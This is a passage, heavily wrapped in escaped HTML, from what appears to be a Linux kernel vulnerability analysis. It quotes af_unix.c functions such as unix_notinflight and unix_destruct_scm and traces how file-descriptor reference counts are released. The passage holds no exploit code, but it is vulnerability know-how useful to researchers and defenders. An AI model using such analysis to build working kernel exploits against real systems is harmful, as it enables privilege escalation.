class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;for&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;i &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;count&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c35\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c35\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;--)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; unix_notinflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;user&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;[&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;]);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_notinflight&lt;/span&gt;&lt;span&gt;&amp;nbsp;from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_detach_fds&lt;/span&gt;&lt;span&gt;&amp;nbsp;will reverse the effect of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;by decrementing the inflight count:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.d890a653a46688c713ffbe9f71996b050052c85f\"&gt;&lt;/a&gt;&lt;a id=\"t.14\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;void&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_notinflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;user_struct &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;user&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;file &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;sock &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;s &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_get_socket&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; spin_lock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;unix_gc_lock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;s&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_sock &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_sk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;s&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BUG_ON&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(!&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;atomic_long_read&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BUG_ON&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list_empty&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14 ykcrMYlEiJ-c7\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;atomic_long_dec_and_test&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;))&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; list_del_init&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; unix_tot_inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;--;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;unix_inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;--;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; spin_unlock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;unix_gc_lock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Later &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb_unlink&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;consume_skb&lt;/span&gt;&lt;span&gt;&amp;nbsp;are invoked from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_stream_read_generic&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/af_unix.c#L2451\"&gt;af_unix.c#2451&lt;/a&gt;&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;&amp;nbsp;to destroy the current &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span&gt;. Following the call chain &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;kfree(skb)-&amp;gt;__kfree_skb&lt;/span&gt;&lt;span&gt;, the kernel will invoke the function pointer &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb-&amp;gt;destructor&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/af_unix.c#L1605\"&gt;code&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) which redirects to &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_destruct_scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.d928301c0cdf3e7a332926420806a793608d77ac\"&gt;&lt;/a&gt;&lt;a id=\"t.15\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;static&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;void&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_destruct_scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;sk_buff &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm_cookie scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; memset&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c35\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;sizeof&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;.&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;pid &amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;).&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;pid&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14 ykcrMYlEiJ-c7\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;).&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; unix_detach_fds&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* Alas, it calls VFS */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* So fscking what? fput() had been SMP-safe since the last Summer */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; scm_destroy&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sock_wfree&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;In fact, the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_detach_fds&lt;/span&gt;&lt;span&gt;&amp;nbsp;will not be invoked again here from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_destruct_scm&lt;/span&gt;&lt;span&gt;&amp;nbsp;because &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;UNIXCB(skb).fp&lt;/span&gt;&lt;span&gt;&amp;nbsp;is already cleared by &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_detach_fds&lt;/span&gt;&lt;span&gt;. Finally, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;fd_install(new_fd, get_file(fp[i]))&lt;/span&gt;&lt;span&gt;&amp;nbsp;from &lt;/span&gt;&lt;span 